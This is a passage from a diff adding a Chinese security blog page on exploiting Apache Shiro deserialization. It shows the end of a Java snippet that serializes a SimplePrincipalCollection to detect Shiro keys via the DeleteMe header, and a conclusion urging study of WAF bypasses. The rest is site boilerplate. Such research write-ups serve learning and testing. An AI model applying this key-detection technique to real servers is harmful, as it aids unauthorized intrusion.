+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(simplePrincipalCollection);
+        oos.close();
+
+        return barr.toByteArray();
+    &#125;
+&#125;</code></pre>
+<p>通过返回头有没有DeleteMe字段来检测密钥，利用限制更小。当然WAF可能也会对这些类进行拦截，可以使用上面的方法或者寻找其他类进行绕过。</p>
+<p><img src="./JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-%E6%B5%85%E8%B0%88Shiro%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/17.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学习一个漏洞的利用，不应该只是单纯在本地自己搭建的环境进行复现。更需要学习各种WAF的绕过，不出网等各种各样情况下该怎么进行应对。如果没有学习过WAF的常规绕过，又面对现在大部分网站都部署WAF的情况下可能会错过非常多的漏洞。然后就是不出网情况的利用，这种情况还是很常见。现在往往为了保证网站服务器的安全，会把网站的服务器设置成不出网状态会把服务端口经过各种映射让用户访问。</p>
+<p>以上是作者自己是思考见解，如有不对还望大家指点！</p>
+<h2 id="文章参考"><a href="#文章参考" class="headerlink" title="文章参考"></a>文章参考</h2><p>P牛的JAVA安全漫谈</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/119987906">[Java反序列化]CommonsBeanutils1利用链学习</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.lmxspace.com/2020/08/24/%E4%B8%80%E7%A7%8D%E5%8F%A6%E7%B1%BB%E7%9A%84shiro%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/">一种另类的shiro检测方式</a></p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">0xEaS</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://keepaha.com/2022/04/07/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-%E6%B5%85%E8%B0%88Shiro%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">http://keepaha.com/2022/04/07/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-%E6%B5%85%E8%B0%88Shiro%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">0xEaS</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2022/04/07/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-%E6%B5%85%E8%B0%88Shiro%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="JAVA反序列篇-浅谈Shiro利用分析">
+                        
+                        <span class="card-title">JAVA反序列篇-浅谈Shiro利用分析</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-07
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            0xEaS
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/03/28/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-CommonsCollections3%E7%9A%84%E7%94%B1%E6%9D%A5/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="JAVA反序列篇-CommonsCollections3的由来">
+                        
+                        <span class="card-title">JAVA反序列篇-CommonsCollections3的由来</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-28
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            0xEaS
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2022</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">0xEaS</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/chenguangyi1/chenguangyi1.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:742917877@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=742917877" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 742917877" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
